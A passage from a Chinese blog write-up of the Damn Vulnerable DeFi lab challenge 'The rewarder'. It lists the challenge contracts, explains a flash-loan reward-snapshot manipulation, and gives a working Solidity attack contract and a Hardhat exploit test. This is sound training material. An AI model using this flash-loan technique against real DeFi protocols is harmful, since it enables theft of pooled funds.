+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line"></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/security/ReentrancyGuard.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/utils/Address.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;../DamnValuableToken.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@title</span> <span class="variable">FlashLoanerPool</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@dev</span> A simple pool to get flash loans of DVT</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">contract <span class="title class_">FlashLoanerPool</span> is <span class="title class_">ReentrancyGuard</span> &#123;</span><br><span class="line"></span><br><span class="line">    using <span class="title class_">Address</span> <span class="keyword">for</span> address;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">DamnValuableToken</span> public immutable liquidityToken;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address liquidityTokenAddress</span>) &#123;</span><br><span class="line">        liquidityToken = <span class="title class_">DamnValuableToken</span>(liquidityTokenAddress);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">flashLoan</span>(<span class="params">uint256 amount</span>) external nonReentrant &#123;</span><br><span class="line">        uint256 balanceBefore = liquidityToken.<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>));</span><br><span class="line">        <span class="built_in">require</span>(amount &lt;= balanceBefore, <span class="string">&quot;Not enough token balance&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">sender</span>.<span class="title function_">isContract</span>(), <span class="string">&quot;Borrower must be a deployed contract&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        liquidityToken.<span class="title function_">transfer</span>(msg.<span class="property">sender</span>, amount);</span><br><span class="line"></span><br><span class="line">        msg.<span class="property">sender</span>.<span class="title function_">functionCall</span>(</span><br><span class="line">            abi.<span class="title function_">encodeWithSignature</span>(</span><br><span class="line">                <span class="string">&quot;receiveFlashLoan(uint256)&quot;</span>,</span><br><span class="line">                amount</span><br><span class="line">            )</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="built_in">require</span>(liquidityToken.<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>)) &gt;= balanceBefore, <span class="string">&quot;Flash loan not paid back&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>基础的闪电贷合约，再给我们贷款后会触发我们的receiveFlashLoan函数，我们可以在这个函数内进行自己的操作并且需要将贷得的代币返回给闪电贷合约。<br>计数代币合约：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line"></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/access/AccessControl.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@title</span> <span class="variable">AccountingToken</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@notice</span> A limited pseudo-ERC20 token to keep track of deposits and withdrawals</span></span><br><span class="line"><span class="comment"> *         with snapshotting capabilities</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">contract <span class="title class_">AccountingToken</span> is <span class="title class_">ERC20Snapshot</span>, <span class="title class_">AccessControl</span> &#123;</span><br><span class="line"></span><br><span class="line">    bytes32 public constant <span class="variable constant_">MINTER_ROLE</span> = <span class="title function_">keccak256</span>(<span class="string">&quot;MINTER_ROLE&quot;</span>);</span><br><span class="line">    bytes32 public constant <span class="variable constant_">SNAPSHOT_ROLE</span> = <span class="title function_">keccak256</span>(<span class="string">&quot;SNAPSHOT_ROLE&quot;</span>);</span><br><span class="line">    bytes32 public constant <span class="variable constant_">BURNER_ROLE</span> = <span class="title function_">keccak256</span>(<span class="string">&quot;BURNER_ROLE&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span>) <span class="title class_">ERC20</span>(<span class="string">&quot;rToken&quot;</span>, <span class="string">&quot;rTKN&quot;</span>) &#123;</span><br><span class="line">        <span class="title function_">_setupRole</span>(<span class="variable constant_">DEFAULT_ADMIN_ROLE</span>, msg.<span class="property">sender</span>);</span><br><span class="line">        <span class="title function_">_setupRole</span>(<span class="variable constant_">MINTER_ROLE</span>, msg.<span class="property">sender</span>);</span><br><span class="line">        <span class="title function_">_setupRole</span>(<span class="variable constant_">SNAPSHOT_ROLE</span>, msg.<span class="property">sender</span>);</span><br><span class="line">        <span class="title function_">_setupRole</span>(<span class="variable constant_">BURNER_ROLE</span>, msg.<span class="property">sender</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">mint</span>(<span class="params">address to, uint256 amount</span>) external &#123;</span><br><span class="line">        <span class="built_in">require</span>(<span class="title function_">hasRole</span>(<span class="variable constant_">MINTER_ROLE</span>, msg.<span class="property">sender</span>), <span class="string">&quot;Forbidden&quot;</span>);</span><br><span class="line">        <span class="title function_">_mint</span>(to, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">burn</span>(<span class="params">address <span class="keyword">from</span>, uint256 amount</span>) external &#123;</span><br><span class="line">        <span class="built_in">require</span>(<span class="title function_">hasRole</span>(<span class="variable constant_">BURNER_ROLE</span>, msg.<span class="property">sender</span>), <span class="string">&quot;Forbidden&quot;</span>);</span><br><span class="line">        <span class="title function_">_burn</span>(<span class="keyword">from</span>, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">snapshot</span>(<span class="params"></span>) external returns (uint256) &#123;</span><br><span class="line">        <span class="built_in">require</span>(<span class="title function_">hasRole</span>(<span class="variable constant_">SNAPSHOT_ROLE</span>, msg.<span class="property">sender</span>), <span class="string">&quot;Forbidden&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">_snapshot</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Do not need transfer of this token</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">_transfer</span>(<span class="params">address, address, uint256</span>) internal pure override &#123;</span><br><span class="line">        <span class="title function_">revert</span>(<span class="string">&quot;Not implemented&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Do not need allowance of this token</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">_approve</span>(<span class="params">address, address, uint256</span>) internal pure override &#123;</span><br><span class="line">        <span class="title function_">revert</span>(<span class="string">&quot;Not implemented&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>顾名思义，只用来计数你向合约中存了多少钱，用于后面的奖励计数<br>奖励代币合约：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line"></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/access/AccessControl.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@title</span> <span class="variable">RewardToken</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@dev</span> A mintable ERC20 with 2 decimals to issue rewards</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">contract <span class="title class_">RewardToken</span> is <span class="title class_">ERC20</span>, <span class="title class_">AccessControl</span> &#123;</span><br><span class="line"></span><br><span class="line">    bytes32 public constant <span class="variable constant_">MINTER_ROLE</span> = <span class="title function_">keccak256</span>(<span class="string">&quot;MINTER_ROLE&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span>) <span class="title class_">ERC20</span>(<span class="string">&quot;Reward Token&quot;</span>, <span class="string">&quot;RWT&quot;</span>) &#123;</span><br><span class="line">        <span class="title function_">_setupRole</span>(<span class="variable constant_">DEFAULT_ADMIN_ROLE</span>, msg.<span class="property">sender</span>);</span><br><span class="line">        <span class="title function_">_setupRole</span>(<span class="variable constant_">MINTER_ROLE</span>, msg.<span class="property">sender</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">mint</span>(<span class="params">address to, uint256 amount</span>) external &#123;</span><br><span class="line">        <span class="built_in">require</span>(<span class="title function_">hasRole</span>(<span class="variable constant_">MINTER_ROLE</span>, msg.<span class="property">sender</span>));</span><br><span class="line">        <span class="title function_">_mint</span>(to, amount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>基础的ERC20合约，用来向用户发奖。<br>经过上面的分析，我们的思路已经很明确了，就是在闪电贷合约中借钱，然后存入矿池中，继而得到奖励代币，再将奖励代币发送给attacker，然后将钱返还给闪电贷合约，即可完成攻击。</p>
+<h2 id="攻击-4"><a href="#攻击-4" class="headerlink" title="攻击"></a>攻击</h2><p>攻击合约：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line"></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;./RewardToken.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;../DamnValuableToken.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;./TheRewarderPool.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;./FlashLoanerPool.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line">contract rewardAttack &#123;</span><br><span class="line">    <span class="title class_">RewardToken</span> rewardTO;</span><br><span class="line">    <span class="title class_">TheRewarderPool</span> rewardPool;</span><br><span class="line">    <span class="title class_">DamnValuableToken</span> liquidToken;</span><br><span class="line">    <span class="title class_">FlashLoanerPool</span> flashPool;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span></span><br><span class="line"><span class="params">        address rt,</span></span><br><span class="line"><span class="params">        address rp,</span></span><br><span class="line"><span class="params">        address lt,</span></span><br><span class="line"><span class="params">        address fl</span></span><br><span class="line"><span class="params">    </span>) public &#123;</span><br><span class="line">        rewardTO = <span class="title class_">RewardToken</span>(rt);</span><br><span class="line">        rewardPool = <span class="title class_">TheRewarderPool</span>(rp);</span><br><span class="line">        liquidToken = <span class="title class_">DamnValuableToken</span>(lt);</span><br><span class="line">        flashPool = <span class="title class_">FlashLoanerPool</span>(fl);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">attack</span>(<span class="params"></span>) public &#123;</span><br><span class="line">        uint256 amount = liquidToken.<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(flashPool));</span><br><span class="line">        flashPool.<span class="title function_">flashLoan</span>(amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">receiveFlashLoan</span>(<span class="params">uint256 amount</span>) public &#123;</span><br><span class="line">        liquidToken.<span class="title function_">approve</span>(<span class="title function_">address</span>(rewardPool), amount);</span><br><span class="line">        rewardPool.<span class="title function_">deposit</span>(amount);</span><br><span class="line">        rewardPool.<span class="title function_">withdraw</span>(amount);</span><br><span class="line">        liquidToken.<span class="title function_">transfer</span>(<span class="title function_">address</span>(flashPool), amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">complete</span>(<span class="params"></span>) public &#123;</span><br><span class="line">        rewardTO.<span class="title function_">transfer</span>(msg.<span class="property">sender</span>, rewardTO.<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">fallback</span>() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>js攻击合约；</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">it</span>(<span class="string">&#x27;Exploit&#x27;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="comment">/** CODE YOUR EXPLOIT HERE */</span></span><br><span class="line">        <span class="keyword">await</span> ethers.<span class="property">provider</span>.<span class="title function_">send</span>(<span class="string">&quot;evm_increaseTime&quot;</span>, [<span class="number">5</span> * <span class="number">24</span> * <span class="number">60</span> * <span class="number">60</span>]);</span><br><span class="line">        <span class="keyword">const</span> <span class="title class_">RewardAttckFactory</span> = <span class="keyword">await</span> ethers.<span class="title function_">getContractFactory</span>(<span class="string">&quot;rewardAttack&quot;</span>,attacker)</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">attackContract</span> = <span class="keyword">await</span> <span class="title class_">RewardAttckFactory</span>.<span class="title function_">deploy</span>(<span class="variable language_">this</span>.<span class="property">rewardToken</span>.<span class="property">address</span>,<span class="variable language_">this</span>.<span class="property">rewarderPool</span>.<span class="property">address</span>,<span class="variable language_">this</span>.<span class="property">liquidityToken</span>.<span class="property">address</span>,<span class="variable language_">this</span>.<span class="property">flashLoanPool</span>.<span class="property">address</span>);</span><br><span class="line">        <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">attackContract</span>.<span class="title function_">connect</span>(attacker).<span class="title function_">attack</span>();</span><br><span class="line">        <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">attackContract</span>.<span class="title function_">connect</span>(attacker).<span class="title function_">complete</span>();</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">rewardToken</span>.<span class="title function_">balanceOf</span>(attacker.<span class="property">address</span>))</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure>
+<p>按照我们的攻击思路走，在攻击合约中，先借出闪电贷合约的所有存款，随后在receiveFlashLoan函数中将存款存入矿池，得到奖励后从矿池中取出，再将存款返还给闪电贷合约。最后，调用complete函数将得到的奖励代币发送给attacker，即可完成攻击。<br><img src="https://img-blog.csdnimg.cn/0382e08d10dc44ca94bba3947ec9e8c6.png" alt="在这里插入图片描述"><br>执行脚本，完成攻击。</p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>lucifer
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://example.com/2022/12/01/DamnVulnerableDeFi%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98-1-5/" title="DamnVulnerableDeFi靶场实战(1-5)">http://example.com/2022/12/01/DamnVulnerableDeFi靶场实战-1-5/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/12/01/capture-the-ether%E9%9D%B6%E5%9C%BA%E9%A2%98%E8%A7%A3-Miscellaneous/" rel="prev" title="capture the ether靶场题解(Miscellaneous)">
+      <i class="fa fa-chevron-left"></i> capture the ether靶场题解(Miscellaneous)
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2022/12/01/DamnVulnerableDeFi%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98-6-10/" rel="next" title="DamnVulnerableDeFi靶场实战(6-10)">
+      DamnVulnerableDeFi靶场实战(6-10) <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Unstoppable"><span class="nav-number">1.</span> <span class="nav-text">Unstoppable</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E6%9E%90"><span class="nav-number">1.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E5%87%BB"><span class="nav-number">1.2.</span> <span class="nav-text">攻击</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Naive-Receiver"><span class="nav-number">2.</span> <span class="nav-text">Naive Receiver</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E6%9E%90-1"><span class="nav-number">2.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E5%87%BB-1"><span class="nav-number">2.2.</span> <span class="nav-text">攻击</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Truster"><span class="nav-number">3.</span> <span class="nav-text">Truster</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E6%9E%90-2"><span class="nav-number">3.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E5%87%BB-2"><span class="nav-number">3.2.</span> <span class="nav-text">攻击</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Side-entrance"><span class="nav-number">4.</span> <span class="nav-text">Side entrance</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E6%9E%90-3"><span class="nav-number">4.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E5%87%BB-3"><span class="nav-number">4.2.</span> <span class="nav-text">攻击</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#The-rewarder"><span class="nav-number">5.</span> <span class="nav-text">The rewarder</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E6%9E%90-4"><span class="nav-number">5.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E5%87%BB-4"><span class="nav-number">5.2.</span> <span class="nav-text">攻击</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">lucifer</p>
+  <div class="site-description" itemprop="description">我的老婆严菡是猪</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">18</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2022-12 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lucifer</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">190k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">2:53</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
